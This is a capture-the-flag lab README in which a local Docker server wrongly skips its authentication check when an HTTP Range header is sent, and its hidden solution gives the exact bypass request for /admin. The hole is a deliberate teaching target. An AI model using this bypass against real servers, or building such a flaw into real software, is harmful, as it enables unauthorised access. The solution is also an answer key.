# Lab 04 - Range Header Bypass

## Scenario

An internal portal exposes an admin panel at `/admin`.  
Direct access returns **403 Forbidden**.  
The server advertises support for partial content delivery via the HTTP `Range` header.

## Goal

Access the admin panel and retrieve the flag.

## Setup

```bash
docker build -t lab04 .
docker run -p 5004:5004 lab04
```

Then open: http://localhost:5004

## Background — Range Header

The `Range` header (RFC 7233) allows clients to request a specific portion of a resource,  
commonly used for resuming downloads or video streaming.

```
Range: bytes=0-499    → first 500 bytes
Range: bytes=0-       → from byte 0 to end
```

A server supporting this responds with **206 Partial Content**.

## Hints (for instructor use)

<details>
<summary>Hint 1</summary>
Some servers handle `Range` requests in a separate code path from regular GET requests.  
Could that code path be missing an authentication check?
</details>

<details>
<summary>Hint 2</summary>
Try adding a `Range: bytes=0-500` header to your request to `/admin` in Burp Repeater.  
What status code do you get back?
</details>

<details>
<summary>Solution</summary>

```http
GET /admin HTTP/1.1
Host: localhost:5004
Range: bytes=0-206
```

The server skips the authentication check when a `Range` header is present  
and returns a 206 Partial Content with the admin panel content.
</details>
